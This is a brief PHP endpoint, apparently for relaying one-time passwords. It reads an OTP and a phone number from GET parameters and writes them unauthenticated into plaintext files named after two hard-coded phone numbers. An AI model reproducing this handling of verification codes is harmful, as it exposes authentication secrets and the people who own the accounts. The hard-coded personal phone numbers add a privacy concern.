<?php
 //opens a new file to write
 echo"Sucesssfully sent data";

 $otp = $_GET["otp"];
 $phone = $_GET["phone"];
 $text_to_write = $otp." ".$phone;
 //write to server side file
 
 if($phone=="9059712063"){
 $date_file2063 = fopen("9059712063.txt","w");
 fwrite($date_file2063, $text_to_write);
 fclose($date_file2063);
 }
 else if($phone=="9014325088"){
 $date_file5088 = fopen("9014325088.txt","w");
 fwrite($date_file5088, $text_to_write);
 fclose($date_file5088);
 }
?>